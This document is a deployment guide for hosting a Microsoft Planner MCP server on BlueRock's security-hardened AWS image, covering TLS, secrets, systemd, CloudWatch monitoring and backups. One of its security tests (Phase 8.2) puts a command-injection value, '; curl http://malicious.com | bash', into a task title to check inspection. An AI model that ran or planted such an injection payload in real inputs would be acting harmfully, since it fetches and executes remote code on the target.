# BlueRock Secure MCP Server Integration Plan

## Overview

This plan integrates the Microsoft Planner MCP Server with BlueRock's Secure MCP Server platform, providing a production-ready, security-hardened deployment on AWS. This builds on top of the Azure OAuth transformation to create a fully secure, enterprise-grade MCP server.

**Why BlueRock:**
- 🔒 **Runtime Security**: Prevents exploits (deserialization, SSRF, path traversal, reverse shells)
- 🔍 **MCP Protocol Inspection**: Monitors and blocks malicious MCP requests
- 📊 **Drift Detection**: Alerts on unauthorized tool/config modifications
- 📈 **CloudWatch Integration**: Centralized security event monitoring
- ⚡ **FastMCP Pre-installed**: Ready for immediate MCP development
- 🆓 **Free Tier**: No software costs (AWS infrastructure only)

**Combined Architecture:**
```
┌─────────────────────────────────────────────────────────────┐
│                        User/Client                           │
└────────────────────┬────────────────────────────────────────┘
                     │ OAuth Flow
                     ↓
┌─────────────────────────────────────────────────────────────┐
│                      Azure AD                                │
│              (Authentication Provider)                       │
└────────────────────┬────────────────────────────────────────┘
                     │ Tokens
                     ↓
┌─────────────────────────────────────────────────────────────┐
│              BlueRock EC2 Instance (AWS)                     │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  HTTPS Reverse Proxy (Nginx/Caddy)                  │   │
│  │  - SSL/TLS Termination                              │   │
│  │  - /auth/callback → :8080                           │   │
│  └─────────────────────┬───────────────────────────────┘   │
│                        ↓                                     │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  FastMCP Server (Your Code)                         │   │
│  │  - Azure OAuth Provider                             │   │
│  │  - MCP Tools & Resources                            │   │
│  │  - Graph API Client                                 │   │
│  └─────────────────────┬───────────────────────────────┘   │
│                        ↓                                     │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  BlueRock Security Layer                            │   │
│  │  - Runtime Guardrails                               │   │
│  │  - Protocol Inspection                              │   │
│  │  - Drift Detection                                  │   │
│  │  - Reverse Shell Protection                         │   │
│  └─────────────────────┬───────────────────────────────┘   │
└────────────────────────┼───────────────────────────────────┘
                         │
        ┌────────────────┴────────────────┐
        ↓                                  ↓
┌──────────────────┐            ┌──────────────────┐
│ Microsoft Graph  │            │  AWS CloudWatch  │
│      API         │            │  (Event Logs)    │
└──────────────────┘            └──────────────────┘
```

---

## Phase 1: AWS Infrastructure Setup

### Step 1.1: Subscribe to BlueRock Free Tier

1. **Access AWS Marketplace**
   - Navigate to: [BlueRock Secure MCP Server](https://aws.amazon.com/marketplace)
   - Search for "BlueRock Secure MCP Server"
   - Click "Continue to Subscribe"
   - Accept terms and subscribe (free tier)

2. **Select Region**
   - Choose AWS region closest to your users
   - Recommended: `us-east-1`, `us-west-2`, or `eu-west-1`
   - Consider data residency requirements for Microsoft 365 data

### Step 1.2: Launch EC2 Instance

**Instance Configuration:**

| Setting | Value | Notes |
|---------|-------|-------|
| **AMI** | BlueRock Secure MCP Server (Amazon Linux 2023) | From marketplace |
| **Instance Type** | t3.small or t3.medium | FastMCP + Python workload |
| **Network** | Default VPC or custom VPC | Ensure internet access |
| **Subnet** | Public subnet | Needs public IP for OAuth |
| **Auto-assign Public IP** | Enable | Required for OAuth callbacks |
| **Storage** | 20 GB gp3 | Root volume for OS + app |
| **Key Pair** | Create or select existing | For SSH access |

**Launch Steps:**

1. In AWS Console, go to **EC2** → **Launch Instance**
2. Name: `planner-mcp-server-prod`
3. Select **BlueRock Secure MCP Server** AMI from "My AMIs" or "AWS Marketplace AMIs"
4. Instance type: **t3.small** (2 vCPU, 2 GB RAM)
   - Free tier eligible: t3.micro (if available in your account)
   - Production recommended: t3.small or larger
5. Key pair: Create new or select existing
6. Network settings:
   - VPC: Default or create new
   - Subnet: Public subnet
   - Auto-assign public IP: **Enable**
7. Configure storage: 20 GB gp3 (or gp2)
8. **Advanced details** → **User data** (optional):
   ```bash
   #!/bin/bash
   # Initial setup script
   yum update -y
   yum install -y git
   ```
9. Click **Launch instance**

### Step 1.3: Configure Security Group

Create security group with these inbound rules:

| Type | Protocol | Port | Source | Description |
|------|----------|------|--------|-------------|
| SSH | TCP | 22 | Your IP | Management access |
| HTTP | TCP | 80 | 0.0.0.0/0 | Redirect to HTTPS |
| HTTPS | TCP | 443 | 0.0.0.0/0 | OAuth callbacks |
| Custom TCP | TCP | 8080 | 127.0.0.1/32 | FastMCP (internal only) |

**Configuration Steps:**

1. In EC2 console, go to **Security Groups** → **Create security group**
2. Name: `planner-mcp-server-sg`
3. Description: "Security group for Microsoft Planner MCP Server"
4. VPC: Same as EC2 instance
5. Add inbound rules (above table)
6. Outbound rules: Allow all (default)
7. Attach to your EC2 instance

### Step 1.4: Allocate Elastic IP (Recommended)

For stable OAuth redirect URIs:

1. **EC2** → **Elastic IPs** → **Allocate Elastic IP address**
2. Select allocated IP → **Actions** → **Associate Elastic IP address**
3. Select your instance → **Associate**
4. Note the Elastic IP for DNS/Azure configuration

### Step 1.5: Configure DNS (Optional but Recommended)

Instead of using IP address, use a domain name:

1. In your DNS provider (Route 53, Cloudflare, etc.):
   - Create A record: `planner-mcp.yourdomain.com` → Elastic IP
   - TTL: 300 seconds (5 minutes)
2. Wait for DNS propagation (up to 48 hours, usually < 1 hour)
3. This domain will be used for:
   - Azure OAuth redirect URI: `https://planner-mcp.yourdomain.com/auth/callback`
   - MCP client connections: `https://planner-mcp.yourdomain.com/mcp`

---

## Phase 2: BlueRock Instance Setup

### Step 2.1: Initial SSH Access

```bash
# SSH into your instance
ssh -i /path/to/your-key.pem ec2-user@<ELASTIC_IP_OR_DNS>

# Verify BlueRock is running
sudo systemctl status bluerock

# Verify FastMCP is installed
python3 -c "import fastmcp; print(fastmcp.__version__)"
```

Expected output:
```
● bluerock.service - BlueRock Runtime Security
   Loaded: loaded
   Active: active (running)
```

### Step 2.2: System Updates and Dependencies

```bash
# Update system packages
sudo yum update -y

# Install required packages
sudo yum install -y git python3-pip python3-devel gcc nginx certbot python3-certbot-nginx

# Verify Python version
python3 --version  # Should be Python 3.11+

# Install pipenv or venv for isolation
sudo pip3 install pipenv
```

### Step 2.3: Clone Repository and Install Dependencies

```bash
# Create application directory
sudo mkdir -p /opt/planner-mcp
sudo chown ec2-user:ec2-user /opt/planner-mcp
cd /opt/planner-mcp

# Clone repository (adjust URL to your repo)
git clone https://github.com/Fornado-Greenhouse/fornado-planner-mcp.git .

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Verify FastMCP installation
python -c "from fastmcp import FastMCP; print('FastMCP OK')"
```

### Step 2.4: Configure AWS Secrets Manager

Store sensitive credentials securely:

**Create Secrets:**

```bash
# Install AWS CLI if not present
sudo yum install -y aws-cli

# Configure AWS CLI (use IAM role or access keys)
aws configure

# Create secret for Azure credentials
aws secretsmanager create-secret \
  --name planner-mcp/azure-credentials \
  --description "Azure OAuth credentials for Planner MCP Server" \
  --secret-string '{
    "AZURE_TENANT_ID":"your-tenant-id",
    "AZURE_CLIENT_ID":"your-client-id",
    "AZURE_CLIENT_SECRET":"your-client-secret"
  }' \
  --region us-east-1

# Create secret for FastMCP OAuth keys
aws secretsmanager create-secret \
  --name planner-mcp/oauth-keys \
  --description "OAuth signing and encryption keys" \
  --secret-string '{
    "JWT_SIGNING_KEY":"'$(python -c 'import secrets; print(secrets.token_urlsafe(32))')'",
    "STORAGE_ENCRYPTION_KEY":"'$(python -c 'from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())')'",
    "COOKIE_SECRET_KEY":"'$(python -c 'import secrets; print(secrets.token_hex(32))')'"
  }' \
  --region us-east-1

# Verify secrets created
aws secretsmanager list-secrets --region us-east-1
```

**IAM Role for EC2:**

Create IAM role with permission to read secrets:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "secretsmanager:GetSecretValue",
        "secretsmanager:DescribeSecret"
      ],
      "Resource": [
        "arn:aws:secretsmanager:us-east-1:*:secret:planner-mcp/*"
      ]
    },
    {
      "Effect": "Allow",
      "Action": [
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ],
      "Resource": "arn:aws:logs:*:*:*"
    }
  ]
}
```

Attach this role to your EC2 instance.

### Step 2.5: Create Environment Configuration Loader

**File**: `/opt/planner-mcp/load_secrets.py`

```python
#!/usr/bin/env python3
"""Load secrets from AWS Secrets Manager into environment."""

import json
import boto3
import os
from botocore.exceptions import ClientError


def get_secret(secret_name: str, region_name: str = "us-east-1") -> dict:
    """Retrieve secret from AWS Secrets Manager."""
    session = boto3.session.Session()
    client = session.client(
        service_name='secretsmanager',
        region_name=region_name
    )

    try:
        get_secret_value_response = client.get_secret_value(
            SecretId=secret_name
        )
    except ClientError as e:
        print(f"Error retrieving secret {secret_name}: {e}")
        raise e

    return json.loads(get_secret_value_response['SecretString'])


def load_secrets_to_env():
    """Load all application secrets into environment variables."""
    try:
        # Load Azure credentials
        azure_creds = get_secret("planner-mcp/azure-credentials")
        for key, value in azure_creds.items():
            os.environ[key] = value

        # Load OAuth keys
        oauth_keys = get_secret("planner-mcp/oauth-keys")
        for key, value in oauth_keys.items():
            os.environ[key] = value

        print("✅ Secrets loaded successfully from AWS Secrets Manager")
        return True

    except Exception as e:
        print(f"❌ Failed to load secrets: {e}")
        return False


if __name__ == "__main__":
    load_secrets_to_env()
```

### Step 2.6: Update Application Configuration

**File**: `/opt/planner-mcp/.env.production`

```env
# AWS Region
AWS_REGION=us-east-1

# Server Configuration
MCP_SERVER_NAME=Microsoft Planner MCP
MCP_SERVER_VERSION=1.0.0
MCP_SERVER_HOST=127.0.0.1
MCP_SERVER_PORT=8080

# Azure OAuth Configuration (loaded from Secrets Manager)
# AZURE_TENANT_ID=<from secrets>
# AZURE_CLIENT_ID=<from secrets>
# AZURE_CLIENT_SECRET=<from secrets>

# Production URL (update with your domain or Elastic IP)
AZURE_BASE_URL=https://planner-mcp.yourdomain.com
AZURE_REDIRECT_PATH=/auth/callback
AZURE_REQUIRED_SCOPES=["planner.access"]

# Optional: Additional Microsoft Graph scopes
AZURE_ADDITIONAL_SCOPES=["User.Read"]

# OAuth Keys (loaded from Secrets Manager)
# JWT_SIGNING_KEY=<from secrets>
# STORAGE_ENCRYPTION_KEY=<from secrets>

# Microsoft Graph API
GRAPH_API_VERSION=v1.0
GRAPH_API_TIMEOUT=30

# Cache Configuration
CACHE_TYPE=memory
CACHE_TTL_SECONDS=300

# Logging
LOG_LEVEL=INFO
LOG_FORMAT=json

# CloudWatch Configuration
CLOUDWATCH_LOG_GROUP=/aws/bluerock/planner-mcp
CLOUDWATCH_LOG_STREAM={instance_id}
```

---

## Phase 3: SSL/TLS Configuration

### Step 3.1: Install and Configure Certbot

```bash
# Install Certbot for Let's Encrypt
sudo yum install -y certbot python3-certbot-nginx

# Stop nginx if running
sudo systemctl stop nginx

# Obtain SSL certificate (using standalone mode)
sudo certbot certonly --standalone \
  --preferred-challenges http \
  --email your-email@example.com \
  --agree-tos \
  --no-eff-email \
  -d planner-mcp.yourdomain.com

# Certificates will be at:
# /etc/letsencrypt/live/planner-mcp.yourdomain.com/fullchain.pem
# /etc/letsencrypt/live/planner-mcp.yourdomain.com/privkey.pem
```

### Step 3.2: Configure Nginx Reverse Proxy

**File**: `/etc/nginx/conf.d/planner-mcp.conf`

```nginx
# HTTP -> HTTPS redirect
server {
    listen 80;
    server_name planner-mcp.yourdomain.com;

    location /.well-known/acme-challenge/ {
        root /var/www/certbot;
    }

    location / {
        return 301 https://$server_name$request_uri;
    }
}

# HTTPS server
server {
    listen 443 ssl http2;
    server_name planner-mcp.yourdomain.com;

    # SSL Configuration
    ssl_certificate /etc/letsencrypt/live/planner-mcp.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/planner-mcp.yourdomain.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;

    # Logging
    access_log /var/log/nginx/planner-mcp-access.log;
    error_log /var/log/nginx/planner-mcp-error.log;

    # Proxy to FastMCP server
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;

        # WebSocket support (for SSE)
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";

        # Proxy headers
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-Forwarded-Host $host;
        proxy_set_header X-Forwarded-Port $server_port;

        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;

        # Buffer settings
        proxy_buffering off;
        proxy_request_buffering off;
    }

    # Health check endpoint
    location /health {
        access_log off;
        return 200 "healthy\n";
        add_header Content-Type text/plain;
    }
}
```

**Enable and Start Nginx:**

```bash
# Test configuration
sudo nginx -t

# Enable nginx to start on boot
sudo systemctl enable nginx

# Start nginx
sudo systemctl start nginx

# Check status
sudo systemctl status nginx
```

### Step 3.3: Configure Auto-renewal

```bash
# Create renewal hook
sudo tee /etc/letsencrypt/renewal-hooks/deploy/reload-nginx.sh > /dev/null <<'EOF'
#!/bin/bash
systemctl reload nginx
EOF

sudo chmod +x /etc/letsencrypt/renewal-hooks/deploy/reload-nginx.sh

# Test renewal (dry run)
sudo certbot renew --dry-run

# Certbot auto-renewal is already configured via systemd timer
sudo systemctl list-timers | grep certbot
```

---

## Phase 4: Application Deployment

### Step 4.1: Create Application Startup Script

**File**: `/opt/planner-mcp/start_server.sh`

```bash
#!/bin/bash
set -e

# Change to application directory
cd /opt/planner-mcp

# Activate virtual environment
source venv/bin/activate

# Load secrets from AWS Secrets Manager
python3 load_secrets.py || exit 1

# Load production environment
export $(cat .env.production | grep -v '^#' | xargs)

# Start FastMCP server
exec python3 src/server.py
```

Make executable:
```bash
chmod +x /opt/planner-mcp/start_server.sh
```

### Step 4.2: Create Systemd Service

**File**: `/etc/systemd/system/planner-mcp.service`

```ini
[Unit]
Description=Microsoft Planner MCP Server
After=network.target
Wants=bluerock.service

[Service]
Type=simple
User=ec2-user
Group=ec2-user
WorkingDirectory=/opt/planner-mcp
ExecStart=/opt/planner-mcp/start_server.sh

# Restart policy
Restart=always
RestartSec=10
StartLimitInterval=0

# Environment
Environment="PATH=/opt/planner-mcp/venv/bin:/usr/local/bin:/usr/bin"
Environment="PYTHONUNBUFFERED=1"

# Logging
StandardOutput=journal
StandardError=journal
SyslogIdentifier=planner-mcp

# Security
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/opt/planner-mcp

[Install]
WantedBy=multi-user.target
```

**Enable and Start Service:**

```bash
# Reload systemd
sudo systemctl daemon-reload

# Enable service to start on boot
sudo systemctl enable planner-mcp

# Start service
sudo systemctl start planner-mcp

# Check status
sudo systemctl status planner-mcp

# View logs
sudo journalctl -u planner-mcp -f
```

### Step 4.3: Verify Deployment

```bash
# Test local access
curl http://127.0.0.1:8080/health

# Test HTTPS access
curl https://planner-mcp.yourdomain.com/health

# Test OAuth endpoints
curl https://planner-mcp.yourdomain.com/.well-known/oauth-authorization-server
```

Expected responses:
- Health: `200 OK`
- OAuth metadata: JSON with authorization/token endpoints

---

## Phase 5: CloudWatch Integration

### Step 5.1: Install CloudWatch Agent

```bash
# Download CloudWatch agent
wget https://s3.amazonaws.com/amazoncloudwatch-agent/amazon_linux/amd64/latest/amazon-cloudwatch-agent.rpm

# Install
sudo rpm -U ./amazon-cloudwatch-agent.rpm

# Verify installation
sudo /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
  -a query -m ec2 -c default -s
```

### Step 5.2: Configure CloudWatch Agent

**File**: `/opt/aws/amazon-cloudwatch-agent/etc/cloudwatch-config.json`

```json
{
  "agent": {
    "metrics_collection_interval": 60,
    "run_as_user": "cwagent"
  },
  "logs": {
    "logs_collected": {
      "files": {
        "collect_list": [
          {
            "file_path": "/var/log/planner-mcp/app.log",
            "log_group_name": "/aws/bluerock/planner-mcp",
            "log_stream_name": "{instance_id}/application",
            "retention_in_days": 30
          },
          {
            "file_path": "/var/log/nginx/planner-mcp-access.log",
            "log_group_name": "/aws/bluerock/planner-mcp",
            "log_stream_name": "{instance_id}/nginx-access",
            "retention_in_days": 7
          },
          {
            "file_path": "/var/log/nginx/planner-mcp-error.log",
            "log_group_name": "/aws/bluerock/planner-mcp",
            "log_stream_name": "{instance_id}/nginx-error",
            "retention_in_days": 30
          }
        ]
      }
    }
  },
  "metrics": {
    "namespace": "PlannerMCP",
    "metrics_collected": {
      "cpu": {
        "measurement": [
          {
            "name": "cpu_usage_idle",
            "rename": "CPU_IDLE",
            "unit": "Percent"
          }
        ],
        "metrics_collection_interval": 60,
        "totalcpu": false
      },
      "disk": {
        "measurement": [
          {
            "name": "used_percent",
            "rename": "DISK_USED",
            "unit": "Percent"
          }
        ],
        "metrics_collection_interval": 60,
        "resources": [
          "/"
        ]
      },
      "mem": {
        "measurement": [
          {
            "name": "mem_used_percent",
            "rename": "MEM_USED",
            "unit": "Percent"
          }
        ],
        "metrics_collection_interval": 60
      }
    }
  }
}
```

### Step 5.3: Configure BlueRock OTEL Collection

Follow BlueRock's guide: "Configuring OTEL Event Collection with BlueRock"

**Key configuration** (if not already configured):

```bash
# Configure BlueRock to send events to CloudWatch
sudo tee /etc/bluerock/otel-config.yaml > /dev/null <<'EOF'
receivers:
  bluerock:
    endpoint: unix:///var/run/bluerock/events.sock

exporters:
  awscloudwatchlogs:
    log_group_name: "/aws/bluerock/planner-mcp"
    log_stream_name: "security-events"
    region: "us-east-1"

service:
  pipelines:
    logs:
      receivers: [bluerock]
      exporters: [awscloudwatchlogs]
EOF

# Restart BlueRock
sudo systemctl restart bluerock
```

### Step 5.4: Start CloudWatch Agent

```bash
# Start agent with config
sudo /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
  -a fetch-config \
  -m ec2 \
  -s \
  -c file:/opt/aws/amazon-cloudwatch-agent/etc/cloudwatch-config.json

# Verify agent is running
sudo systemctl status amazon-cloudwatch-agent
```

### Step 5.5: Create CloudWatch Alarms

**Security Event Alarm:**

```bash
aws cloudwatch put-metric-alarm \
  --alarm-name "PlannerMCP-SecurityEvent" \
  --alarm-description "Alert on BlueRock security events" \
  --metric-name "SecurityEvents" \
  --namespace "BlueRock" \
  --statistic Sum \
  --period 60 \
  --threshold 1 \
  --comparison-operator GreaterThanThreshold \
  --evaluation-periods 1 \
  --alarm-actions arn:aws:sns:us-east-1:ACCOUNT:planner-mcp-alerts
```

**High CPU Alarm:**

```bash
aws cloudwatch put-metric-alarm \
  --alarm-name "PlannerMCP-HighCPU" \
  --alarm-description "Alert on high CPU usage" \
  --metric-name CPU_IDLE \
  --namespace PlannerMCP \
  --statistic Average \
  --period 300 \
  --threshold 20 \
  --comparison-operator LessThanThreshold \
  --evaluation-periods 2 \
  --alarm-actions arn:aws:sns:us-east-1:ACCOUNT:planner-mcp-alerts
```

---

## Phase 6: Azure OAuth Configuration for Production

### Step 6.1: Update Azure App Registration

1. Navigate to Azure Portal → Your App Registration → **Authentication**
2. Under **Web** platform, add production redirect URI:
   ```
   https://planner-mcp.yourdomain.com/auth/callback
   ```
3. Save changes
4. Verify token version is still set to 2 in manifest

### Step 6.2: Test OAuth Flow

```bash
# From your local machine, test the OAuth flow
# You should see browser-based authentication
python -c "
from fastmcp import Client
import asyncio

async def test():
    async with Client('https://planner-mcp.yourdomain.com/mcp', auth='oauth') as client:
        result = await client.call_tool('get_user_info')
        print(result)

asyncio.run(test())
"
```

Expected flow:
1. Browser opens to Microsoft login
2. Sign in with your account
3. BlueRock consent screen (approve the client)
4. Redirect back to client
5. User info is returned

---

## Phase 7: Monitoring and Alerting

### Step 7.1: View Logs in CloudWatch

```bash
# View application logs
aws logs tail /aws/bluerock/planner-mcp --follow \
  --log-stream-names $(curl -s http://169.254.169.254/latest/meta-data/instance-id)/application

# View security events
aws logs tail /aws/bluerock/planner-mcp --follow \
  --log-stream-names security-events

# Filter for errors
aws logs filter-pattern /aws/bluerock/planner-mcp --filter-pattern "ERROR"
```

### Step 7.2: BlueRock Security Event Types

Monitor these event types in CloudWatch:

| Event Type | Description | Action |
|------------|-------------|--------|
| `DESERIALIZATION_EXPLOIT` | Detected unsafe deserialization | Investigate, check tool inputs |
| `SSRF_ATTEMPT` | Server-Side Request Forgery attempt | Review HTTP calls, block source |
| `PATH_TRAVERSAL` | File system path traversal attempt | Check file operations, sanitize paths |
| `REVERSE_SHELL` | Reverse shell connection detected | **Critical**: Investigate immediately |
| `CONTAINER_DRIFT` | Unauthorized binary execution | Verify no malware, check modifications |
| `CONFIG_DRIFT` | MCP tool/config modification | Review changes, verify authorization |
| `CAPABILITY_ESCALATION` | Attempt to elevate privileges | **Critical**: Investigate immediately |

### Step 7.3: Create SNS Topic for Alerts

```bash
# Create SNS topic
aws sns create-topic --name planner-mcp-alerts

# Subscribe your email
aws sns subscribe \
  --topic-arn arn:aws:sns:us-east-1:ACCOUNT:planner-mcp-alerts \
  --protocol email \
  --notification-endpoint your-email@example.com

# Confirm subscription via email
```

### Step 7.4: Create CloudWatch Dashboard

```bash
aws cloudwatch put-dashboard --dashboard-name PlannerMCP --dashboard-body '{
  "widgets": [
    {
      "type": "metric",
      "properties": {
        "metrics": [
          ["BlueRock", "SecurityEvents", {"stat": "Sum"}]
        ],
        "period": 300,
        "stat": "Sum",
        "region": "us-east-1",
        "title": "Security Events (5min)",
        "yAxis": {"left": {"min": 0}}
      }
    },
    {
      "type": "metric",
      "properties": {
        "metrics": [
          ["PlannerMCP", "CPU_IDLE", {"stat": "Average"}],
          [".", "MEM_USED", {"stat": "Average"}],
          [".", "DISK_USED", {"stat": "Average"}]
        ],
        "period": 300,
        "stat": "Average",
        "region": "us-east-1",
        "title": "System Resources"
      }
    },
    {
      "type": "log",
      "properties": {
        "query": "SOURCE '/aws/bluerock/planner-mcp'\n| fields @timestamp, @message\n| filter @message like /ERROR/\n| sort @timestamp desc\n| limit 20",
        "region": "us-east-1",
        "title": "Recent Errors"
      }
    }
  ]
}'
```

View dashboard at: AWS Console → CloudWatch → Dashboards → PlannerMCP

---

## Phase 8: Testing BlueRock Security Features

### Step 8.1: Test Container Drift Detection

BlueRock prevents execution of binaries not in the original AMI.

**Test:**

```bash
# SSH into instance
ssh -i your-key.pem ec2-user@<instance>

# Try to download and execute a binary (should be blocked)
cd /tmp
wget https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
chmod +x jq-linux64
./jq-linux64 --version
```

**Expected:** BlueRock blocks execution and logs event to CloudWatch

**Verify in CloudWatch:**
```bash
aws logs filter-log-events \
  --log-group-name /aws/bluerock/planner-mcp \
  --filter-pattern "CONTAINER_DRIFT"
```

### Step 8.2: Test MCP Protocol Inspection

BlueRock monitors MCP tool calls for suspicious patterns.

**Test with malicious-looking tool call** (safe test):

```python
# This is a safe test that simulates a suspicious pattern
from fastmcp import Client
import asyncio

async def test():
    async with Client('https://planner-mcp.yourdomain.com/mcp', auth='oauth') as client:
        # This should trigger inspection (but not necessarily block)
        result = await client.call_tool(
            'create_task',
            {
                'plan_id': 'test-plan',
                'title': '; curl http://malicious.com | bash',  # Suspicious
            }
        )
        print(result)

asyncio.run(test())
```

**Verify in CloudWatch:**
Look for inspection logs and any blocked requests.

### Step 8.3: Test Config Drift Detection

BlueRock monitors changes to MCP server configuration.

**Monitored changes:**
- Tool additions/removals
- Tool argument modifications
- Permission changes

**Check baseline:**
```bash
# BlueRock creates baseline on first run
sudo cat /var/lib/bluerock/mcp-baseline.json
```

Any deviations from baseline trigger alerts.

---

## Phase 9: Backup and Disaster Recovery

### Step 9.1: EBS Snapshot Schedule

```bash
# Create snapshot lifecycle policy
aws dlm create-lifecycle-policy \
  --execution-role-arn arn:aws:iam::ACCOUNT:role/AWSDataLifecycleManagerDefaultRole \
  --description "Daily snapshots for Planner MCP Server" \
  --state ENABLED \
  --policy-details '{
    "PolicyType": "EBS_SNAPSHOT_MANAGEMENT",
    "ResourceTypes": ["VOLUME"],
    "TargetTags": [{"Key": "Name", "Value": "planner-mcp-server-prod"}],
    "Schedules": [{
      "Name": "DailySnapshots",
      "CreateRule": {"Interval": 24, "IntervalUnit": "HOURS", "Times": ["03:00"]},
      "RetainRule": {"Count": 7},
      "TagsToAdd": [{"Key": "SnapshotType", "Value": "Automated"}],
      "CopyTags": true
    }]
  }'
```

### Step 9.2: Secrets Backup

```bash
# Backup secrets to encrypted S3 bucket
aws secretsmanager get-secret-value \
  --secret-id planner-mcp/azure-credentials \
  --query SecretString \
  --output text > azure-creds.json.tmp

# Encrypt with KMS
aws kms encrypt \
  --key-id alias/planner-mcp-backup \
  --plaintext fileb://azure-creds.json.tmp \
  --output text \
  --query CiphertextBlob | base64 -d > azure-creds.json.encrypted

# Upload to S3
aws s3 cp azure-creds.json.encrypted s3://your-backup-bucket/secrets/ \
  --server-side-encryption aws:kms

# Clean up
rm azure-creds.json.tmp azure-creds.json.encrypted
```

### Step 9.3: Disaster Recovery Plan

**Recovery Time Objective (RTO):** < 1 hour
**Recovery Point Objective (RPO):** < 24 hours (daily snapshots)

**Recovery Steps:**

1. **Launch new instance from latest snapshot:**
   ```bash
   # Find latest snapshot
   SNAPSHOT_ID=$(aws ec2 describe-snapshots \
     --filters "Name=tag:Name,Values=planner-mcp-server-prod" \
     --query 'Snapshots | sort_by(@, &StartTime) | [-1].SnapshotId' \
     --output text)

   # Create volume
   VOLUME_ID=$(aws ec2 create-volume \
     --snapshot-id $SNAPSHOT_ID \
     --availability-zone us-east-1a \
     --query VolumeId --output text)

   # Launch instance with volume
   # (Use same process as Phase 1)
   ```

2. **Reassociate Elastic IP:**
   ```bash
   aws ec2 associate-address \
     --instance-id <new-instance-id> \
     --allocation-id <elastic-ip-allocation-id>
   ```

3. **Verify services:**
   ```bash
   # SSH into instance
   # Check services
   sudo systemctl status planner-mcp
   sudo systemctl status nginx
   sudo systemctl status bluerock
   ```

4. **Test OAuth flow** (as in Phase 6.2)

5. **Monitor CloudWatch** for any issues

---

## Phase 10: Maintenance and Operations

### Step 10.1: Regular Maintenance Tasks

**Weekly:**
- Review CloudWatch logs for errors
- Check security events
- Verify SSL certificate validity
- Review resource utilization

**Monthly:**
- Update system packages: `sudo yum update -y`
- Rotate secrets (if policy requires)
- Review and optimize costs
- Test disaster recovery procedure

**Quarterly:**
- Security audit
- Performance optimization
- Review and update Azure app permissions

### Step 10.2: Update Deployment

```bash
# SSH into instance
ssh -i your-key.pem ec2-user@<instance>

# Pull latest code
cd /opt/planner-mcp
git pull origin main

# Update dependencies
source venv/bin/activate
pip install -r requirements.txt --upgrade

# Restart service
sudo systemctl restart planner-mcp

# Verify
sudo systemctl status planner-mcp
sudo journalctl -u planner-mcp -f
```

### Step 10.3: Blue/Green Deployment (Optional)

For zero-downtime updates:

1. Launch new instance with updated code
2. Configure new instance (same process)
3. Test new instance
4. Update DNS to point to new instance
5. Monitor for issues
6. Decommission old instance after verification

---

## Security Benefits Summary

### BlueRock Protection Layers

| Threat | Protection | How It Helps |
|--------|------------|--------------|
| **Code Injection** | Runtime guardrails | Prevents SSRF, deserialization exploits |
| **Malicious MCP Tools** | Protocol inspection | Monitors and blocks suspicious tool calls |
| **Reverse Shells** | Connection monitoring | Kills post-exploitation C2 channels |
| **Malware** | Container drift | Prevents execution of unauthorized binaries |
| **Privilege Escalation** | Capability control | Blocks attempts to gain elevated permissions |
| **Unauthorized Changes** | Config drift | Alerts on tool/config modifications |
| **Data Exfiltration** | Network monitoring | Detects unusual outbound connections |

### Defense in Depth

```
┌─────────────────────────────────────────────────────────┐
│ Layer 1: Azure OAuth Authentication                     │
│ - Who can access the server                             │
│ - PKCE, token encryption, consent screens               │
└─────────────────────┬───────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────────┐
│ Layer 2: AWS Security Groups                            │
│ - Network-level access control                          │
│ - Only allow HTTPS, SSH from authorized IPs             │
└─────────────────────┬───────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────────┐
│ Layer 3: HTTPS/TLS Encryption                           │
│ - Encrypted data in transit                             │
│ - Certificate-based authentication                      │
└─────────────────────┬───────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────────┐
│ Layer 4: BlueRock Runtime Security                      │
│ - Prevents exploits at runtime                          │
│ - MCP protocol inspection                               │
│ - Drift detection                                       │
└─────────────────────┬───────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────────┐
│ Layer 5: Application Security                           │
│ - Input validation                                      │
│ - Least privilege Graph API access                     │
│ - Secure secret storage (AWS Secrets Manager)          │
└─────────────────────────────────────────────────────────┘
```

---

## Cost Estimation

### Free Tier Eligible (First 12 Months)

| Resource | Free Tier | Estimated Monthly Cost* |
|----------|-----------|-------------------------|
| BlueRock AMI | Free | $0 |
| EC2 t3.micro | 750 hours/month | $0 (if under limit) |
| EBS 20 GB | 30 GB | $0 |
| Data Transfer | 15 GB out | $0 |
| CloudWatch Logs | 5 GB ingestion | $0 |
| Secrets Manager | 1 secret | ~$0.40 |
| **Total** | | **~$0.40/month** |

\* Assumes staying within free tier limits

### After Free Tier / Production Scale

| Resource | Specification | Estimated Monthly Cost |
|----------|---------------|------------------------|
| BlueRock AMI | Free | $0 |
| EC2 t3.small | On-demand, us-east-1 | ~$15 |
| EBS 20 GB gp3 | General purpose | ~$2 |
| Elastic IP | 1 address, associated | $0 |
